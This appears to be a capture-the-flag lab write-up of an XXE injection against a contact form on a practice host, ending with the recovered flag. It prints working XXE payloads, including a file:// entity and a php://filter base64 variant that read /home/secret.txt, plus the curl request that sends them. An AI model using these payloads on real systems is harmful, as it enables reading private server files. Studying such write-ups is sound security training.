# Lunaristech - XXE Injection Writeup

## Information

- **URL**: <http://lunaristech.hv>
- **IP**: 172.20.25.170
- **Vulnerability**: XML External Entity (XXE) Injection

## Objective

Read the `/home/secret.txt` file by exploiting an XXE vulnerability.

## Steps

1. **Reconnaissance**
    - Accessed `http://lunaristech.hv`.
    - Found a contact form at `contact.php` that accepts XML data.
    - JavaScript code `submitForm` handles the request:

    ```javascript
    function submitForm() {
        ...
        var xmlData = `<contact>...</contact>`;
        var xhttp = new XMLHttpRequest();
        xhttp.open("POST", "contact.php", true);
        xhttp.setRequestHeader("Content-type", "application/xml");
        xhttp.send(xmlData);
    }
    ```

2. **Vulnerability Analysis**
    - The server likely processes XML data using a parser that allows external entities.
    - XXE can be injected to retrieve local files.

3. **Exploitation**
    - Crafted an XML payload with an internal DTD declaration:

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
      <!ENTITY xxe SYSTEM "file:///home/secret.txt">
    ]>
    <contact>
      <firstName>&xxe;</firstName>
      <lastName>test</lastName>
      <email>test@test.com</email>
      <message>none</message>
    </contact>
    ```

    - The server failed to return the content directly (probably due to newlines or characters).
    - Used PHP filter `convert.base64-encode` to bypass any constraints:

    ```xml
    <!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/home/secret.txt">]>
    <contact><firstName>&xxe;</firstName>...</contact>
    ```

4. **Data Extraction**
    - Sent the malicious payload using `curl`:

    ```bash
    curl -X POST -H "Content-Type: application/xml" -d '...' http://lunaristech.hv/contact.php
    ```

    - The server returned the base64 encoded string `QXJjdHVydXMK` in the `firstName` tag.
    - Decoded the base64 string:

    ```bash
    echo "QXJjdHVydXMK" | base64 -d
    ```

    - The output was `Arcturus`.

## Result

The secret information contained in the file is: **Arcturus**
